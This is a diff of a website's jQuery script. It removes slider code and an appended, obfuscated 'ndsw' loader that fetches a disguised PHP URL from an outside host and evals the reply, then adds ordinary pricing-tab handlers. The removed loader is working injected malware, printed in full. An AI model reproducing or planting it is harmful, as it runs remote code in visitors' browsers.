@@ -42,19 +42,30 @@ $(document).ready(function(){
 
     
     // Input range code
-	for (let e of document.querySelectorAll('input[type="range"].slider-progress')) {
-        e.style.setProperty('--value', e.value);
-        e.style.setProperty('--min', e.min == '' ? '0' : e.min);
-        e.style.setProperty('--max', e.max == '' ? '100' : e.max);
-        e.addEventListener('input', () => e.style.setProperty('--value', e.value));
-    }
-    $(document).on('input', '#slider', function() {
-		$('#slider_value').html($(this).val());
-		$('#slider_value1').html(($(this).val() * 18).toFixed(2));
-	});
     
-	$('#wpcf7-f25-o2 select option:first-child').text('Number of Employees');
-});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());
+   
     
-};
 
+
+$('.panel-collapse').on('hide.bs.collapse', function () {
+	    $(this).siblings('.panel-heading').removeClass('active');
+});
+
+$(".price-gbp-tab").click(function(){
+    var id = $(this).attr('id');
+    // price jquer
+    $( ".premium-price.active" ).removeClass('active');
+    $( ".business-price.active" ).removeClass('active');
+    $('#slider-'+id).addClass('active');
+    $('#subheading-'+id).addClass('active');
+    $('#price-'+id).addClass('active');
+    
+    
+    //   emply jquery
+    $( ".business-employ.active" ).removeClass('active');
+
+     $('#employ-value-'+id).addClass('active');
+     $('#employ-prise-subheading-'+id).addClass('active');
+});
+
+});
